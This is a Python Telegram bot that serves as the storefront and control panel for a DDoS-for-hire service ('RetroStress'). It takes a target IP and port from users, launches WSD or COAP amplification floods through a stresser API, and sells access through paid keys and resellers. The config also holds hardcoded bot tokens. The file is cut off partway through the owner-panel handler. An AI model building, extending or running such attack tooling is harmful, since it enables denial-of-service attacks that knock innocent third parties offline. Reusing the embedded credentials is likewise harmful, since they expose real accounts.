#!/usr/bin/env python3
"""
RetroStress Telegram Bot - Ultimate Pro Version
Features: Owner Panel, Reseller System, API Management, Full Stats, Clickable Owner
"""

import asyncio
import logging
import json
import sys
import re
import random
import string
from datetime import datetime, timedelta
from typing import Dict, Optional, List
from dataclasses import dataclass, field
import os
import pickle

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ContextTypes, 
    MessageHandler, filters
)

# ============== CONFIGURATION ==============
class Config:
    TELEGRAM_BOT_TOKEN = "8653031348:AAHYE0-0pAqYC21qcVUArqs0cDM7YeV_Qzo"
    OWNER_ID = 1165613821
    OWNER_USERNAME = "XD_Hacker_Owner"
    OWNER_NAME = "𝐗𝐃 𝐇𝐚𝐜𝐤𝐞𝐫 𝐎𝐰𝐧𝐞𝐫"
    
    # Multiple API keys for 100% uptime
    RETROSTRESS_API_KEYS = [
        "7845313276:AAHqNSfConUMlCCZyVPLuuIv28TS-Pb0BOc",
    ]
    
    DEFAULT_DURATION = 180
    MAX_ATTACK_DURATION = 180
    COOLDOWN_SECONDS = 360
    MAX_CONCURRENT_ATTACKS = 4
    PROGRESS_UPDATE_INTERVAL = 2
    
    API_BASE_URL = "https://retrostress.net"
    API_TIMEOUT = 30
    MAX_RETRIES = 5
    
    # Key durations in hours
    KEY_DURATIONS = {
        '1h': 1, '2h': 2, '6h': 6, '12h': 12,
        '24h': 24, '1d': 24, '3d': 72, '7d': 168,
        '1m': 720, '2m': 1440, '1y': 8760
    }
    
    DEFAULT_DAILY_LIMIT = 100

# ============== LOGGING ==============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============== OWNER LINK HELPER ==============
def get_owner_link() -> str:
    """Returns clickable owner link that opens DM"""
    return f"[{Config.OWNER_NAME}](tg://user?id={Config.OWNER_ID})"

def get_owner_mention() -> str:
    """Returns owner mention for notifications"""
    return f"@{Config.OWNER_USERNAME}"

# ============== DATA CLASSES ==============
@dataclass
class Attack:
    attack_id: str
    user_id: int
    target_ip: str
    port: int
    duration: int
    method: str
    start_time: datetime
    status: str = "running"
    message_id: Optional[int] = None
    chat_id: Optional[int] = None
    notification_sent: bool = False

@dataclass
class UserData:
    user_id: int
    username: str = ""
    first_name: str = ""
    registered_at: datetime = field(default_factory=datetime.now)
    total_attacks: int = 0
    last_attack_time: Optional[datetime] = None
    concurrent_attacks: int = 0
    daily_attacks: int = 0
    daily_reset: datetime = field(default_factory=datetime.now)
    daily_limit: int = Config.DEFAULT_DAILY_LIMIT
    is_premium: bool = False
    is_reseller: bool = False
    key_expiry: Optional[datetime] = None
    created_by: Optional[int] = None  # Who created this user (reseller/owner)

@dataclass
class AccessKey:
    key: str
    duration_hours: int
    created_at: datetime
    expires_at: datetime
    created_by: int
    used_by: Optional[int] = None
    used_at: Optional[datetime] = None
    is_used: bool = False
    key_type: str = "user"  # "user" or "reseller"

@dataclass
class ResellerData:
    reseller_id: int
    username: str = ""
    created_at: datetime = field(default_factory=datetime.now)
    total_keys_generated: int = 0
    total_users_created: int = 0
    total_attacks_by_users: int = 0
    is_active: bool = True

# ============== DATABASE ==============
class Database:
    def __init__(self):
        self.users: Dict[int, UserData] = {}
        self.resellers: Dict[int, ResellerData] = {}
        self.active_attacks: Dict[str, Attack] = {}
        self.pending_attacks: Dict[int, dict] = {}
        self.access_keys: Dict[str, AccessKey] = {}
        self.attack_history: List[dict] = []
        self.global_stats = {
            'total_attacks': 0,
            'start_time': datetime.now()
        }
        self.load_data()
        
    def load_data(self):
        try:
            if os.path.exists('bot_data.pkl'):
                with open('bot_data.pkl', 'rb') as f:
                    data = pickle.load(f)
                    self.users = data.get('users', {})
                    self.resellers = data.get('resellers', {})
                    self.access_keys = data.get('access_keys', {})
                    self.attack_history = data.get('attack_history', [])
                    self.global_stats = data.get('global_stats', self.global_stats)
                logger.info("✅ Data loaded")
        except Exception as e:
            logger.error(f"Load failed: {e}")
    
    def save_data(self):
        try:
            data = {
                'users': self.users,
                'resellers': self.resellers,
                'access_keys': self.access_keys,
                'attack_history': self.attack_history,
                'global_stats': self.global_stats
            }
            with open('bot_data.pkl', 'wb') as f:
                pickle.dump(data, f)
        except Exception as e:
            logger.error(f"Save failed: {e}")
        
    def get_user(self, user_id: int, username: str = "", first_name: str = "") -> UserData:
        if user_id not in self.users:
            self.users[user_id] = UserData(
                user_id=user_id,
                username=username,
                first_name=first_name
            )
            self.save_data()
        
        user = self.users[user_id]
        now = datetime.now()
        if (now - user.daily_reset).days >= 1:
            user.daily_attacks = 0
            user.daily_reset = now
            self.save_data()
        
        return user
    
    def add_attack(self, attack: Attack):
        self.active_attacks[attack.attack_id] = attack
        self.global_stats['total_attacks'] += 1
        user = self.users.get(attack.user_id)
        if user:
            user.concurrent_attacks += 1
            user.total_attacks += 1
            user.daily_attacks += 1
            
            # Update reseller stats if user was created by reseller
            if user.created_by and user.created_by in self.resellers:
                self.resellers[user.created_by].total_attacks_by_users += 1
            
            self.save_data()
        
        self.attack_history.append({
            'attack_id': attack.attack_id,
            'user_id': attack.user_id,
            'target': attack.target_ip,
            'port': attack.port,
            'duration': attack.duration,
            'method': attack.method,
            'start_time': attack.start_time,
            'status': 'completed'
        })
    
    def remove_attack(self, attack_id: str):
        if attack_id in self.active_attacks:
            attack = self.active_attacks.pop(attack_id)
            user = self.users.get(attack.user_id)
            if user:
                user.concurrent_attacks = max(0, user.concurrent_attacks - 1)
                self.save_data()
    
    def generate_attack_id(self) -> str:
        patterns = [
            [f"{d}{d}{d}{d}" for d in range(1, 10)],
            [f"{d}{d}{e}{e}" for d in range(1, 9) for e in range(d+1, 10)],
            [f"{d}{e}{d}{e}" for d in range(1, 9) for e in range(1, 10) if d != e],
            [f"{d}{d+1}{d+2}{d+3}" for d in range(1, 7)],
            ['0000'] + [f"00{d}{d}" for d in range(1, 8)] + [f"{d}00{d}" for d in range(1, 10)]
        ]
        
        all_ids = [id for sublist in patterns for id in sublist]
        used_ids = set(self.active_attacks.keys()) | set(h['attack_id'] for h in self.attack_history)
        available = [id for id in all_ids if id not in used_ids]
        
        if available:
            return random.choice(available)
        
        while True:
            new_id = f"{random.randint(0, 9999):04d}"
            if new_id not in used_ids:
                return new_id
    
    def generate_access_key(self, duration_hours: int, created_by: int, key_type: str = "user") -> str:
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        now = datetime.now()
        access_key = AccessKey(
            key=key,
            duration_hours=duration_hours,
            created_at=now,
            expires_at=now + timedelta(hours=duration_hours),
            created_by=created_by,
            key_type=key_type
        )
        self.access_keys[key] = access_key
        
        # Update reseller stats
        if created_by in self.resellers and key_type == "user":
            self.resellers[created_by].total_keys_generated += 1
        
        self.save_data()
        return key
    
    def use_access_key(self, key: str, user_id: int) -> tuple:
        """Returns (success: bool, is_reseller: bool)"""
        if key not in self.access_keys:
            return (False, False)
        
        access_key = self.access_keys[key]
        if access_key.is_used:
            return (False, False)
        
        if datetime.now() > access_key.expires_at:
            return (False, False)
        
        access_key.is_used = True
        access_key.used_by = user_id
        access_key.used_at = datetime.now()
        
        if access_key.key_type == "reseller":
            # Create reseller
            self.resellers[user_id] = ResellerData(
                reseller_id=user_id,
                created_by=access_key.created_by
            )
            self.save_data()
            return (True, True)
        
        # Regular user key
        user = self.users.get(user_id)
        if user:
            user.is_premium = True
            user.key_expiry = access_key.expires_at
            user.daily_limit = 100
            user.created_by = access_key.created_by
            
            # Update reseller user count
            if access_key.created_by in self.resellers:
                self.resellers[access_key.created_by].total_users_created += 1
            
            self.save_data()
        
        return (True, False)
    
    def get_reseller_stats(self, reseller_id: int) -> dict:
        """Get detailed stats for reseller"""
        if reseller_id not in self.resellers:
            return {}
        
        reseller = self.resellers[reseller_id]
        
        # Get all users created by this reseller
        reseller_users = [u for u in self.users.values() if u.created_by == reseller_id]
        total_user_attacks = sum(u.total_attacks for u in reseller_users)
        
        # Get keys generated by this reseller
        reseller_keys = [k for k in self.access_keys.values() if k.created_by == reseller_id and k.key_type == "user"]
        used_keys = sum(1 for k in reseller_keys if k.is_used)
        
        return {
            'total_keys': len(reseller_keys),
            'used_keys': used_keys,
            'total_users': len(reseller_users),
            'total_attacks': total_user_attacks,
            'reseller_data': reseller
        }

# ============== API MANAGER ==============
class RetroStressAPI:
    def __init__(self, api_keys: list):
        self.api_keys = api_keys
        self.current_index = 0
        self.failed_keys: Dict[str, int] = {}
        self.rate_limited: Dict[str, datetime] = {}
        self.session: Optional[aiohttp.ClientSession] = None
        self.backup_endpoints = ["/api/v1/tests", "/api/v2/tests", "/api/tests", "/api/attack"]
        
    async def init(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=Config.API_TIMEOUT),
                headers={"User-Agent": "RetroStressBot/1.0"}
            )
    
    def get_working_key(self) -> Optional[str]:
        if not self.api_keys:
            return None
        
        attempts = 0
        now = datetime.now()
        
        while attempts < len(self.api_keys):
            key = self.api_keys[self.current_index]
            
            if key in self.rate_limited:
                if now < self.rate_limited[key]:
                    self.current_index = (self.current_index + 1) % len(self.api_keys)
                    attempts += 1
                    continue
                del self.rate_limited[key]
            
            if self.failed_keys.get(key, 0) < 3:
                self.current_index = (self.current_index + 1) % len(self.api_keys)
                return key
            
            if self.failed_keys.get(key, 0) >= 3:
                self.failed_keys[key] = 0
            
            self.current_index = (self.current_index + 1) % len(self.api_keys)
            attempts += 1
        
        self.failed_keys = {}
        return self.api_keys[0] if self.api_keys else None
    
    async def make_request(self, method: str, endpoint: str, data: Dict = None, retry: int = 0) -> Dict:
        await self.init()
        
        api_key = self.get_working_key()
        if not api_key:
            return {'error': 'No API keys available', 'status': 'fatal'}
        
        endpoints_to_try = [endpoint] + [e for e in self.backup_endpoints if e != endpoint]
        
        for try_endpoint in endpoints_to_try:
            url = f"{Config.API_BASE_URL}{try_endpoint}"
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
                "X-API-Key": api_key
            }
            
            try:
                if method == "POST":
                    async with self.session.post(url, headers=headers, json=data, timeout=Config.API_TIMEOUT) as resp:
                        if resp.status == 429:
                            self.rate_limited[api_key] = datetime.now() + timedelta(minutes=1)
                            continue
                        elif resp.status in [401, 403]:
                            self.failed_keys[api_key] = self.failed_keys.get(api_key, 0) + 1
                            continue
                        
                        text = await resp.text()
                        try:
                            return json.loads(text)
                        except:
                            return {'text': text, 'status': 'success'}
                            
                elif method == "GET":
                    async with self.session.get(url, headers=headers, timeout=Config.API_TIMEOUT) as resp:
                        text = await resp.text()
                        try:
                            return json.loads(text)
                        except:
                            return {'text': text, 'status': 'success'}
                            
            except asyncio.TimeoutError:
                self.failed_keys[api_key] = self.failed_keys.get(api_key, 0) + 1
                if retry < Config.MAX_RETRIES:
                    await asyncio.sleep(1)
                    return await self.make_request(method, endpoint, data, retry + 1)
                continue
            except Exception as e:
                logger.error(f"API error: {e}")
                continue
        
        return await self.legacy_request(data, api_key)
    
    async def legacy_request(self, data: Dict, api_key: str) -> Dict:
        try:
            url = f"{Config.API_BASE_URL}/api/start"
            params = {
                'key': api_key,
                'target': data.get('target'),
                'port': data.get('port'),
                'time': data.get('duration'),
                'method': data.get('method', 'WSD')
            }
            
            async with self.session.get(url, params=params, timeout=Config.API_TIMEOUT) as resp:
                text = await resp.text()
                try:
                    return json.loads(text)
                except:
                    return {'text': text, 'status': 'success' if resp.status < 400 else 'error'}
        except Exception as e:
            return {'error': str(e)}
    
    async def start_attack(self, ip: str, port: int, duration: int, method: str) -> Dict:
        data = {
            "target": ip,
            "port": port,
            "duration": duration,
            "method": method
        }
        return await self.make_request("POST", "/api/v1/tests", data)

# ============== PROGRESS BAR ==============
def create_progress_bar(elapsed: int, total: int, length: int = 20) -> str:
    filled = int(length * elapsed / total)
    bar = "█" * filled + "░" * (length - filled)
    percentage = int(100 * elapsed / total)
    return f"[{bar}] {percentage}%"

# ============== MAIN BOT ==============
class RetroStressBot:
    def __init__(self):
        self.db = Database()
        self.api = RetroStressAPI(Config.RETROSTRESS_API_KEYS)
        self.application: Optional[Application] = None
        
    # ============== KEYBOARDS ==============
    def owner_main_keyboard(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Global Stats", callback_data='owner_stats')],
            [InlineKeyboardButton("👥 User List", callback_data='owner_users'),
             InlineKeyboardButton("🤝 Resellers", callback_data='owner_resellers')],
            [InlineKeyboardButton("🔑 Generate User Key", callback_data='owner_genkey_user'),
             InlineKeyboardButton("🎁 Generate Reseller Key", callback_data='owner_genkey_reseller')],
            [InlineKeyboardButton("🔧 API Keys", callback_data='owner_api_keys')],
            [InlineKeyboardButton("⚙️ Daily Limits", callback_data='owner_limits')],
            [InlineKeyboardButton("📝 Broadcast", callback_data='owner_broadcast')],
            [InlineKeyboardButton("🚫 Ban User", callback_data='owner_ban'),
             InlineKeyboardButton("✅ Unban User", callback_data='owner_unban')],
            [InlineKeyboardButton("📜 Attack History", callback_data='owner_history')],
            [InlineKeyboardButton("❌ Cancel", callback_data='owner_cancel')]
        ])
    
    def reseller_main_keyboard(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 My Stats", callback_data='reseller_stats')],
            [InlineKeyboardButton("🔑 Generate User Key", callback_data='reseller_genkey')],
            [InlineKeyboardButton("👥 My Users", callback_data='reseller_users')],
            [InlineKeyboardButton("📜 My History", callback_data='reseller_history')],
            [InlineKeyboardButton("❌ Cancel", callback_data='reseller_cancel')]
        ])
    
    def key_duration_keyboard(self, callback_prefix: str) -> InlineKeyboardMarkup:
        buttons = []
        durations = [
            ('1 Hour', '1h'), ('2 Hours', '2h'), ('6 Hours', '6h'),
            ('12 Hours', '12h'), ('24 Hours', '24h'), ('3 Days', '3d'),
            ('7 Days', '7d'), ('1 Month', '1m'), ('2 Months', '2m'),
            ('1 Year', '1y')
        ]
        
        for i in range(0, len(durations), 2):
            row = []
            for name, code in durations[i:i+2]:
                row.append(InlineKeyboardButton(name, callback_data=f'{callback_prefix}_{code}'))
            buttons.append(row)
        
        # Add cancel button
        if callback_prefix.startswith('owner'):
            buttons.append([InlineKeyboardButton("❌ Cancel", callback_data='owner_cancel')])
        else:
            buttons.append([InlineKeyboardButton("❌ Cancel", callback_data='reseller_cancel')])
        
        return InlineKeyboardMarkup(buttons)
    
    def api_keys_keyboard(self) -> InlineKeyboardMarkup:
        buttons = [
            [InlineKeyboardButton("➕ Add API Key", callback_data='api_add')],
            [InlineKeyboardButton("📋 View All Keys", callback_data='api_view')],
            [InlineKeyboardButton("🗑 Delete Key", callback_data='api_delete')],
            [InlineKeyboardButton("🔄 Refresh Status", callback_data='api_refresh')],
            [InlineKeyboardButton("❌ Cancel", callback_data='owner_cancel')]
        ]
        return InlineKeyboardMarkup(buttons)
    
    def back_to_owner_keyboard(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back to Owner Panel", callback_data='owner_panel')]
        ])
    
    def back_to_reseller_keyboard(self) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back to Reseller Panel", callback_data='reseller_panel')]
        ])
    
    def methods_keyboard(self, ip: str, port: int, duration: int) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("⚡ WSD", callback_data=f'attack_wsd_{ip}_{port}_{duration}'),
                InlineKeyboardButton("🔥 COAP", callback_data=f'attack_coap_{ip}_{port}_{duration}')
            ],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel_attack')]
        ])
    
    # ============== COMMANDS ==============
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_data = self.db.get_user(user.id, user.username, user.first_name)
        
        # Check if user has active key
        key_status = ""
        if user_data.is_premium and user_data.key_expiry:
            if datetime.now() < user_data.key_expiry:
                remaining = user_data.key_expiry - datetime.now()
                key_status = f"\n🔑 **𝐏𝐫𝐞𝐦𝐢𝐮𝐦:** ✅ 𝐀𝐜𝐭𝐢𝐯𝐞 ({remaining.days}𝐝 {remaining.seconds//3600}𝐡 𝐥𝐞𝐟𝐭)\n"
            else:
                user_data.is_premium = False
                key_status = "\n🔑 **𝐏𝐫𝐞𝐦𝐢𝐮𝐦:** ❌ 𝐄𝐱𝐩𝐢𝐫𝐞𝐝\n"
        
        # Check if reseller
        reseller_status = ""
        if user.id in self.db.resellers:
            reseller_status = "\n🤝 **𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫:** ✅ 𝐀𝐜𝐭𝐢𝐯𝐞\n"
        
        daily_remaining = user_data.daily_limit - user_data.daily_attacks
        
        welcome_text = (
            f"👋 **𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐑𝐞𝐭𝐫𝐨𝐒𝐭𝐫𝐞𝐬𝐬 𝐁𝐨𝐭** ⚡\n\n"
            f"🤖 **𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬:** 🟢 𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧𝐚𝐥\n"
            f"👤 **𝐔𝐬𝐞𝐫:** @{user.username or 'N/A'}\n"
            f"🆔 **𝐈𝐃:** `{user.id}`\n"
            f"{key_status}"
            f"{reseller_status}"
            f"📊 **𝐃𝐚𝐢𝐥𝐲 𝐋𝐢𝐦𝐢𝐭:** {user_data.daily_attacks}/{user_data.daily_limit} (𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: {daily_remaining})\n\n"
            f"📨 **𝐒𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐞𝐭𝐚𝐢𝐥𝐬:**\n\n"
            f"**𝐅𝐨𝐫𝐦𝐚𝐭:**\n"
            f"`𝐈𝐏 𝐏𝐎𝐑𝐓` → 𝐀𝐮𝐭𝐨 {Config.DEFAULT_DURATION}𝐬\n"
            f"`𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄` → 𝐂𝐮𝐬𝐭𝐨𝐦 𝐭𝐢𝐦𝐞\n\n"
            f"**𝐄𝐱𝐚𝐦𝐩𝐥𝐞:**\n"
            f"`𝟏.𝟏.𝟏.𝟏 𝟐𝟐𝟔𝟔𝟐`\n"
            f"`𝟏.𝟏.𝟏.𝟏 𝟐𝟐𝟔𝟔𝟐 𝟏𝟐𝟎`\n\n"
            f"👑 **𝐎𝐰𝐧𝐞𝐫:** {get_owner_link()}\n"
            f"⚡ **𝐌𝐞𝐭𝐡𝐨𝐝𝐬:** 𝐖𝐒𝐃 & 𝐂𝐎𝐀𝐏"
        )
        
        await update.message.reply_text(welcome_text, parse_mode='Markdown', disable_web_page_preview=True)
    
    async def cmd_owner(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Owner panel - only owner can access"""
        user = update.effective_user
        
        if user.id != Config.OWNER_ID:
            await update.message.reply_text(
                f"🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃** 🚫\n\n"
                f"❌ 𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐢𝐬 𝐨𝐧𝐥𝐲 𝐟𝐨𝐫 𝐎𝐖𝐍𝐄𝐑!\n\n"
                f"👑 **𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫:** {get_owner_link()}\n"
                f"📩 𝐂𝐥𝐢𝐜𝐤 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐃𝐌",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        await update.message.reply_text(
            f"👑 **𝐎𝐖𝐍𝐄𝐑 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 𝐏𝐀𝐍𝐄𝐋** 👑\n\n"
            f"🔑 **𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬:** {len(self.db.access_keys)}\n"
            f"👥 **𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬:** {len(self.db.users)}\n"
            f"🤝 **𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬:** {len(self.db.resellers)}\n"
            f"🧪 **𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:** {len(self.db.active_attacks)}\n\n"
            f"👇 **𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧:**",
            reply_markup=self.owner_main_keyboard(),
            parse_mode='Markdown'
        )
    
    async def cmd_reseller(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Reseller panel - only resellers can access"""
        user = update.effective_user
        
        if user.id not in self.db.resellers:
            await update.message.reply_text(
                f"🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃** 🚫\n\n"
                f"❌ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫!\n\n"
                f"🔑 𝐁𝐮𝐲 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐤𝐞𝐲 𝐟𝐫𝐨𝐦: {get_owner_link()}\n"
                f"📩 𝐂𝐥𝐢𝐜𝐤 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐃𝐌",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        stats = self.db.get_reseller_stats(user.id)
        
        await update.message.reply_text(
            f"🤝 **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋** 🤝\n\n"
            f"📊 **𝐘𝐨𝐮𝐫 𝐒𝐭𝐚𝐭𝐬:**\n"
            f"🔑 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {stats.get('total_keys', 0)}\n"
            f"✅ 𝐊𝐞𝐲𝐬 𝐔𝐬𝐞𝐝: {stats.get('used_keys', 0)}\n"
            f"👥 𝐔𝐬𝐞𝐫𝐬 𝐂𝐫𝐞𝐚𝐭𝐞𝐝: {stats.get('total_users', 0)}\n"
            f"🚀 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: {stats.get('total_attacks', 0)}\n\n"
            f"👇 **𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧:**",
            reply_markup=self.reseller_main_keyboard(),
            parse_mode='Markdown'
        )
    
    async def cmd_redeem(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Redeem access key"""
        if not context.args:
            await update.message.reply_text(
                f"❌ **𝐔𝐬𝐚𝐠𝐞:** `/redeem 𝐘𝐎𝐔𝐑_𝐊𝐄𝐘`\n\n"
                f"👑 **𝐍𝐞𝐞𝐝 𝐚 𝐤𝐞𝐲?** 𝐂𝐨𝐧𝐭𝐚𝐜𝐭: {get_owner_link()}",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        key = context.args[0].upper()
        user = update.effective_user
        
        success, is_reseller = self.db.use_access_key(key, user.id)
        
        if success:
            if is_reseller:
                # Reseller key redeemed
                await update.message.reply_text(
                    f"🎉 **𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐔𝐋𝐀𝐓𝐈𝐎𝐍𝐒!** 🎉\n\n"
                    f"✅ **𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐰 𝐚 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑!** 🤝\n\n"
                    f"🔑 **𝐊𝐞𝐲:** `{key}`\n"
                    f"📅 **𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝:** {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                    f"💼 **𝐘𝐨𝐮 𝐜𝐚𝐧 𝐧𝐨𝐰:**\n"
                    f"• 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐮𝐬𝐞𝐫 𝐤𝐞𝐲𝐬\n"
                    f"• 𝐕𝐢𝐞𝐰 𝐲𝐨𝐮𝐫 𝐬𝐭𝐚𝐭𝐬\n"
                    f"• 𝐌𝐨𝐧𝐢𝐭𝐨𝐫 𝐲𝐨𝐮𝐫 𝐮𝐬𝐞𝐫𝐬\n\n"
                    f"🤝 𝐔𝐬𝐞 `/reseller` 𝐭𝐨 𝐨𝐩𝐞𝐧 𝐲𝐨𝐮𝐫 𝐩𝐚𝐧𝐞𝐥\n\n"
                    f"👑 **𝐓𝐡𝐚𝐧𝐤𝐬 𝐭𝐨:** {get_owner_link()}",
                    parse_mode='Markdown',
                    disable_web_page_preview=True
                )
                
                # Notify owner
                try:
                    await self.application.bot.send_message(
                        Config.OWNER_ID,
                        f"🤝 **𝐍𝐄𝐖 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑!** 🤝\n\n"
                        f"👤 @{user.username or 'N/A'} (`{user.id}`)\n"
                        f"🔑 𝐊𝐞𝐲: `{key}`\n"
                        f"🕐 {datetime.now().strftime('%H:%M:%S')}",
                        parse_mode='Markdown'
                    )
                except:
                    pass
            else:
                # User key redeemed
                user_data = self.db.get_user(user.id)
                await update.message.reply_text(
                    f"✅ **𝐊𝐄𝐘 𝐑𝐄𝐃𝐄𝐄𝐌𝐄𝐃!** ✅\n\n"
                    f"🔑 **𝐊𝐞𝐲:** `{key}`\n"
                    f"⏱ **𝐄𝐱𝐩𝐢𝐫𝐞𝐬:** {user_data.key_expiry.strftime('%Y-%m-%d %H:%M')}\n"
                    f"📊 **𝐃𝐚𝐢𝐥𝐲 𝐋𝐢𝐦𝐢𝐭:** {user_data.daily_limit} 𝐚𝐭𝐭𝐚𝐜𝐤𝐬\n\n"
                    f"🎉 **𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐰 𝐏𝐑𝐄𝐌𝐈𝐔𝐌!**\n\n"
                    f"👑 **𝐓𝐡𝐚𝐧𝐤𝐬 𝐭𝐨:** {get_owner_link()}",
                    parse_mode='Markdown',
                    disable_web_page_preview=True
                )
        else:
            await update.message.reply_text(
                f"❌ **𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐄𝐱𝐩𝐢𝐫𝐞𝐝 𝐊𝐞𝐲!**\n\n"
                f"👑 **𝐁𝐮𝐲 𝐚 𝐤𝐞𝐲:** {get_owner_link()}\n"
                f"📩 𝐂𝐥𝐢𝐜𝐤 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐃𝐌",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
    
    # ============== CALLBACK HANDLERS ==============
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        user = update.effective_user
        
        # OWNER PANEL HANDLERS
        if data.startswith('owner_'):
            if user.id != Config.OWNER_ID:
                await query.edit_message_text(
                    f"🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃** 🚫\n\n"
                    f"❌ 𝐎𝐧𝐥𝐲 𝐟𝐨𝐫 𝐎𝐖𝐍𝐄𝐑!\n\n"
                    f"👑 {get_owner_link()}",
                    parse_mode='Markdown',
                    disable_web_page_preview=True
                )
                return
            
            await self.handle_owner_callbacks(query, data, context)
            return
        
        # RESELLER PANEL HANDLERS
        if data.startswith('reseller_'):
            if user.id not in self.db.resellers:
                await query.edit_message_text(
                    f"🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃** 🚫\n\n"
                    f"❌ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫!\n\n"
                    f"👑 {get_owner_link()}",
                    parse_mode='Markdown',
                    disable_web_page_preview=True
                )
                return
            
            await self.handle_reseller_callbacks(query, data, context)
            return
        
        # API KEY HANDLERS
        if data.startswith('api_'):
            if user.id != Config.OWNER_ID:
                await query.edit_message_text("🚫 **𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝**", parse_mode='Markdown')
                return
            
            await self.handle_api_callbacks(query, data, context)
            return
        
        # ATTACK METHODS
        if data.startswith('attack_'):
            parts = data.split('_')
            method = parts[1].upper()
            ip = parts[2]
            port = int(parts[3])
            duration = int(parts[4])
            
            if user.id in self.db.pending_attacks:
                del self.db.pending_attacks[user.id]
            
            await self.execute_attack(query, user.id, ip, port, duration, method)
        
        elif data == 'cancel_attack':
            if user.id in self.db.pending_attacks:
                del self.db.pending_attacks[user.id]
            await query.edit_message_text("❌ **𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝**", parse_mode='Markdown')
    
    async def handle_owner_callbacks(self, query, data, context):
        """Handle owner panel callbacks"""
        user = query.from_user
        
        if data == 'owner_panel':
            await query.edit_message_text(
                f"👑 **𝐎𝐖𝐍𝐄𝐑 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 𝐏𝐀𝐍𝐄𝐋** 👑\n\n"
                f"🔑 **𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬:** {len(self.db.access_keys)}\n"
                f"👥 **𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬:** {len(self.db.users)}\n"
                f"🤝 **𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬:** {len(self.db.resellers)}\n"
